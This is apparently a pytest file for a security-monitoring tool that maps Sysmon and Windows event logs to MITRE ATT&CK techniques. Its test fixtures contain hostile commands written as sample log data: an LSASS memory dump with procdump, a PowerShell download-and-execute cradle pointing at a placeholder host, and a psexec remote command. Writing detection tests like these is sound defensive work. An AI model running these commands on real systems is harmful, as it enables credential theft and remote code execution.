"""Sysmon + extended Windows event coverage (owner 2026-10-14): execution, privilege
escalation, lateral movement, credential dumping and persistence become visible."""

from __future__ import annotations

import pytest

from src.knowledge.attack_details import TECHNIQUE_TACTICS, techniques_for_tactic
from src.soc.correlate import TACTIC_ORDER, TECHNIQUES
from src.soc.parsers import parse_winsec

SYSMON = "Microsoft-Windows-Sysmon"


@pytest.mark.parametrize(
    ("obj", "source", "kind", "techs"),
    [
        (
            {"Id": 1, "ProviderName": SYSMON, "Message": "Process Create:\nImage: C:\\Windows\\System32\\cmd.exe\n"
             "CommandLine: procdump.exe -ma lsass.exe out.dmp"},
            "sysmon", "credential_dumping", ["T1003"],
        ),
        (
            {"Id": 10, "Message": "Process accessed:\nRuleName: -\nUtcTime: 2026-10-14\n"
             "SourceImage: C:\\x\\evil.exe\nTargetImage: C:\\Windows\\system32\\lsass.exe"},
            "sysmon", "lsass_access", ["T1003"],
        ),
        (
            {"Id": 13, "ProviderName": SYSMON, "Message": "Registry value set:\nTargetObject: "
             "HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater"},
            "sysmon", "autostart_added", ["T1547"],
        ),
        ({"Id": 8, "ProviderName": SYSMON, "Message": "CreateRemoteThread detected:"},
         "sysmon", "remote_thread_created", ["T1055"]),
        (
            {"Id": 4104, "Message": "Creating Scriptblock text: IEX (New-Object "
             "Net.WebClient).DownloadString('http://x/a.ps1')"},
            "winsec", "download_cradle", ["T1105"],
        ),
        ({"Id": 4104, "Message": "Creating Scriptblock text: Get-ChildItem C:\\"},
         "winsec", "powershell_script", []),
        (
            {"Id": 4624, "Message": "An account was successfully logged on.\nLogon Type:\t\t10\n"
             "Source Network Address:\t198.51.100.7"},
            "winsec", "remote_interactive_logon", ["T1021"],
        ),
        ({"Id": 4624, "Message": "Logon Type:\t\t2"}, "winsec", "successful_logon", []),
        ({"Id": 4698, "Message": "A scheduled task was created."},
         "winsec", "scheduled_task_created", ["T1053"]),
        ({"Id": 4719, "Message": "System audit policy was changed."},
         "winsec", "audit_policy_changed", ["T1562"]),
        ({"Id": 4688, "Message": "Process Command Line: psexec \\\\host cmd"},
         "winsec", "remote_execution", ["T1021"]),
    ],
)  # fmt: skip
def test_events_map_to_techniques(obj, source, kind, techs) -> None:  # noqa: ANN001
    ev = parse_winsec(obj)
    assert ev is not None
    assert (ev["source"], ev["kind"]) == (source, kind)
    # the built-in rule's technique comes first; Sigma community rules may add more
    # evidence (e.g. a renamed-tool T1036), never take it away
    assert ev["techniques"][: len(techs)] == techs
    assert techs or not [t for t in ev["techniques"] if t in ("T1110", "T1003")]


def test_new_tactics_are_now_detectable() -> None:
    for tactic in ("lateral-movement", "privilege-escalation", "execution"):
        assert techniques_for_tactic(tactic), tactic
    assert "lateral-movement" in TACTIC_ORDER and "privilege-escalation" in TACTIC_ORDER
    assert set(TECHNIQUE_TACTICS) == set(TECHNIQUES)
